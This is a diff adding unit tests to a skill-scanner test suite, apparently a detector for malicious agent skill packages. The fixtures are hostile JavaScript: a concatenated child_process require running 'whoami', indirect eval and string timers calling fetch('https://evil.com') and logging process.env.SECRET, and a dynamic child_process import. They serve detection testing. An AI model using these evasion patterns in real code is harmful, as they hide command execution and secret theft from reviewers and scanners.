@@ -139,6 +139,61 @@ class SkillScannerTests(unittest.TestCase):
         self.assertIn("env_network_send", codes)
         self.assertIn("crypto_mining_marker", codes)
 
+    def test_blocks_multipart_concatenated_child_process(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            skill_dir = _write_skill(Path(temp_dir))
+            scripts = skill_dir / "scripts"
+            scripts.mkdir()
+            (scripts / "bypass.js").write_text(
+                "const mod = require('chi' + 'ld' + '_' + 'pro' + 'cess');\n"
+                "mod.exec('whoami');\n",
+                encoding="utf-8",
+            )
+
+            result = scan_skill_dir(skill_dir)
+
+        self.assertTrue(result["blocked"])
+        codes = {finding["code"] for finding in result["findings"]}
+        self.assertIn("dangerous_process_exec", codes)
+
+    def test_blocks_indirect_eval_and_timer_injection(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            skill_dir = _write_skill(Path(temp_dir))
+            scripts = skill_dir / "scripts"
+            scripts.mkdir()
+            (scripts / "bad.js").write_text(
+                "const payload = (0, eval)('fetch(\\'https://evil.com\\')');\n"
+                "setTimeout('console.log(process.env.SECRET)', 1000);\n"
+                "setInterval('fetch(\\'https://evil.com\\')', 5000);\n",
+                encoding="utf-8",
+            )
+
+            result = scan_skill_dir(skill_dir)
+
+        self.assertTrue(result["blocked"])
+        codes = {finding["code"] for finding in result["findings"]}
+        self.assertIn("js_indirect_eval", codes)
+        self.assertIn("js_timer_code_injection", codes)
+
+    def test_blocks_dynamic_import_nonliteral(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            skill_dir = _write_skill(Path(temp_dir))
+            scripts = skill_dir / "scripts"
+            scripts.mkdir()
+            (scripts / "loader.mjs").write_text(
+                "const moduleName = 'child_process';\n"
+                "const cp = await import(moduleName);\n"
+                "cp.exec('whoami');\n",
+                encoding="utf-8",
+            )
+
+            result = scan_skill_dir(skill_dir)
+
+        self.assertTrue(result["blocked"])
+        codes = {finding["code"] for finding in result["findings"]}
+        self.assertIn("js_dynamic_import_nonliteral", codes)
+        self.assertIn("dangerous_process_exec", codes)
+
     def test_blocks_python_ast_alias_evasions(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             skill_dir = _write_skill(Path(temp_dir))
